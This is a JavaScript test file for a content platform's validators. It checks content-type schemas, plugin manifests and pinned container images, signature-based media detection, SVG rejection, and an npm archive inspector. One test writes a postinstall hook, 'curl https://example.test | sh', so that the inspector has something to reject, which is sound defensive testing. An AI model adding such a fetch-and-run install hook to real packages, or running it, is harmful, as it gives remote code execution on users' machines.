'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { validateContentTypeDefinition, validateRecordValues } = require('../packages/domain/src/content-types');
const { validatePluginManifest, validatePinnedImageDigest } = require('../packages/plugins/src/manifest');
const { createContainerPluginRunner } = require('../packages/plugins/src/container-runner');
const { detectImageType, createLocalMediaStore } = require('../packages/media/src/local-store');

const contentType = {
  apiVersion: 1, name: 'article', label: 'Article', source: 'admin', version: 1,
  capabilities: ['read','create','edit','submitForReview'], publicationPolicy: 'review-required',
  fields: [
    { name: 'summary', type: 'string', required: true, maxLength: 400 },
    { name: 'featured', type: 'boolean', required: false },
    { name: 'status', type: 'enum', required: true, enum: ['draft','live'] }
  ]
};

test('custom content-type definitions and values are validated before storage', () => {
  assert.equal(validateContentTypeDefinition(contentType).valid, true);
  assert.equal(validateRecordValues(contentType, { summary: 'A short summary', status: 'draft', featured: true }).valid, true);
  assert.equal(validateRecordValues(contentType, { summary: 'x'.repeat(401), status: 'not-valid', extra: 1 }).valid, false);
  assert.equal(validateContentTypeDefinition({ ...contentType, name: '../users' }).valid, false);
  assert.equal(validateContentTypeDefinition({ ...contentType, fields: [...contentType.fields, contentType.fields[0]] }).valid, false);
});

test('third-party plugin manifests only allow the versioned capability vocabulary', () => {
  const manifest = { apiVersion: 1, name: 'vendor.example-widget', version: '1.2.3', title: 'Example', description: 'A safe example', capabilities: ['render:widget'], widgets: [{ name: 'example.card', title: 'Card' }] };
  assert.equal(validatePluginManifest(manifest).valid, true);
  assert.equal(validatePluginManifest({ ...manifest, capabilities: ['filesystem:root'] }).valid, false);
  assert.equal(validatePluginManifest({ ...manifest, surprise: true }).valid, false);
  assert.equal(validatePinnedImageDigest(`registry.example/plugin@sha256:${'a'.repeat(64)}`), true);
  assert.equal(validatePinnedImageDigest('registry.example/plugin:latest'), false);
});

test('isolated plugin runner fails closed unless an immutable image is explicitly allow-listed', async () => {
  const runner = createContainerPluginRunner({ allowedImages: [] });
  await assert.rejects(() => runner.invoke({ imageDigest: 'registry.example/plugin:latest', action: 'render.widget', input: {} }), { code: 'ERR_SYSTEMFABRIC_PLUGIN_IMAGE_NOT_PINNED' });
  await assert.rejects(() => runner.invoke({ imageDigest: `registry.example/plugin@sha256:${'a'.repeat(64)}`, action: 'render.widget', input: {} }), { code: 'ERR_SYSTEMFABRIC_PLUGIN_IMAGE_NOT_ALLOWED' });
  assert.throws(() => createContainerPluginRunner({ timeoutMs: 10 }), /timeout/);
});

test('media type checks are based on file signatures, not client MIME labels', () => {
  const png = Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,0x00]);
  const jpeg = Buffer.from([0xff,0xd8,0xff,0x00]);
  assert.equal(detectImageType(png), 'image/png');
  assert.equal(detectImageType(jpeg), 'image/jpeg');
  assert.equal(detectImageType(Buffer.from('<svg></svg>')), null);
});

test('media upload rejects SVG and unsupported files before touching storage', async () => {
  const calls = [];
  const store = createLocalMediaStore({ pool: { query: async (...args) => { calls.push(args); return { rows: [] }; } }, root: '/tmp/systemfabric-media-tests' });
  await assert.rejects(() => store.upload({ siteId: '00000000-0000-4000-8000-000000000001', dataBase64: Buffer.from('<svg></svg>').toString('base64'), mimeType: 'image/svg+xml' }), { code: 'ERR_SYSTEMFABRIC_MEDIA_INVALID' });
  assert.equal(calls.length, 0);
});

test('npm archive inspector validates safe metadata and rejects install lifecycle scripts', async t => {
  const fs = require('node:fs'); const os = require('node:os'); const path = require('node:path'); const { execFileSync } = require('node:child_process');
  const { inspectNpmArchive } = require('../packages/plugins/src/archive-inspector');
  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'sf-plugin-')); t.after(() => fs.promises.rm(root, { recursive: true, force: true }));
  const packageRoot = path.join(root, 'package'); await fs.promises.mkdir(packageRoot);
  const packageJson = {
    name: 'vendor-example-widget', version: '1.0.0',
    systemfabricPlugin: { apiVersion: 1, name: 'vendor.example-widget', version: '1.0.0', title: 'Example Widget', description: 'Example', capabilities: ['render:widget'] }
  };
  const jsonPath = path.join(packageRoot, 'package.json'); await fs.promises.writeFile(jsonPath, JSON.stringify(packageJson));
  const archive = path.join(root, 'valid.tgz'); execFileSync('tar', ['-czf', archive, '-C', root, 'package']);
  const valid = await inspectNpmArchive(archive); assert.equal(valid.packageVersion, '1.0.0'); assert.equal(valid.manifest.name, 'vendor.example-widget');

  // Some tar implementations preserve a leading ./ prefix and archive-root entry.
  const prefixedRoot = path.join(root, 'prefixed-root');
  await fs.promises.mkdir(path.join(prefixedRoot, 'package'), { recursive: true });
  await fs.promises.writeFile(path.join(prefixedRoot, 'package', 'package.json'), JSON.stringify(packageJson));
  const prefixedArchive = path.join(root, 'prefixed.tgz');
  execFileSync('tar', ['-czf', prefixedArchive, '-C', prefixedRoot, '.']);
  const prefixed = await inspectNpmArchive(prefixedArchive);
  assert.equal(prefixed.packageVersion, '1.0.0');
  packageJson.scripts = { postinstall: 'curl https://example.test | sh' }; await fs.promises.writeFile(jsonPath, JSON.stringify(packageJson));
  const scripted = path.join(root, 'scripted.tgz'); execFileSync('tar', ['-czf', scripted, '-C', root, 'package']);
  await assert.rejects(() => inspectNpmArchive(scripted), { code: 'ERR_SYSTEMFABRIC_PLUGIN_INSTALL_SCRIPT' });
});
